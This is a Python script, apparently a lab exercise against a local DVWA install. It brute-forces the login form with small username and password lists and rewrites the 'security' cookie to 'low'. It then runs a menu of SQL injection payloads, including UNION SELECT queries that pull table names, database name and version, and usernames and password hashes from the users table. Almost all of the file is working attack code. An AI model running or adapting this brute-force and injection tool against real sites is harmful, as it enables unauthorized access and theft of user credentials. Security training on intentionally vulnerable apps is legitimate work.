
import mechanize
import re

# Brute Force For Login
admin_list = ['user', '', 'mayirp', 'rihim', 'admin', 'tima', 'ssb']
pass_list = ['user0', 'abcd@123', 'pass123', 'password']

br=mechanize.Browser()
br.set_handle_robots(False)
print("\nChecking Database Admin and Password: -+-+-+-+")
for ad in admin_list :
        for pa in pass_list :
                br.open("http://localhost/DVWA-master/login.php")
                br.select_form(nr = 0)
                br["username"] = ad
                br["password"] = pa
                sub = br.submit()
                if sub.geturl() != 'http://localhost/DVWA-master/login.php' :
                        print("\n___________________________\n\n| Password Matched:")
                        print("| Username: ", ad)
                        print("| Password: ", pa)
                        print("___________________________")
                        break
print("\n\n",sub.geturl())

# Lower Security Of Cookies
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies :
    if c.name == 'security' :
        c.value = 'low'
    else :
        cookie_dict[c.name] = c.value
print(cookie_dict)

# SQL Injection
injects = ["1'", "'", "500' OR 1='1", "1' OR 1 = 1 UNION SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#", "1' OR 1 = 1 UNION SELECT user, password FROM users#"]

print("\n\n********* MENU *********\n1. Vulnerability Check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data From User Table\n6. Exit")
op = int(input("Enter Your Option: "))
while op != 6 :
        
        if op < 1 or op > 6 :
                print("Enter correct input")
                print("********* MENU *********\n1. Vulnerability Check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data From User Table\n6. Exit")
                op = int(input("Enter Your Option: "))
                continue
        
        flag = 0
        inj = injects[op - 1]
        
        print("Checking ", inj)
        br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
        br.select_form(nr = 0)
        br["id"] = inj
        sub = br.submit()
        print(sub.geturl())
        content = sub.read().decode("utf-8")
        
        if inj == "'" and "You have an error in your SQL syntax" not in content :
                break
        else :
                print("\n:::::::::       WEBSITE IS SQL VULNERABLE       :::::::::\n")
                flag = 1
                if inj == "'" :
                        br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
                        br.select_form(nr = 0)
                        br["id"] = "' union select database(),version()'--+"
                        sub = br.submit()
                        content = sub.read().decode("utf-8")
                        beg = content.rfind('<pre>')
                        end = content.rfind('</pre>')
                        print("-----------------------------------------DATABASE Name and Version-----------------------------------------")
                        print("| ",content[beg : end]," |")
                        print("-----------------------------------------------------------------------------------------------------------")

        beg = [m.start() for m in re.finditer('<pre>',content)]
        end = [m.start() for m in re.finditer('</pre>',content)]
        
        for i in range(len(beg)) :
                print("| ",content[beg[i] : end[i]])

        if flag == 0 :
                print("Not Vulnerable")
        
        print("______________________________________________________________________________________________________________________________________\n")
        print("\n********* MENU *********\n1. Vulnerability Check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data From User Table\n6. Exit")
        op = int(input("Enter Your Option: "))
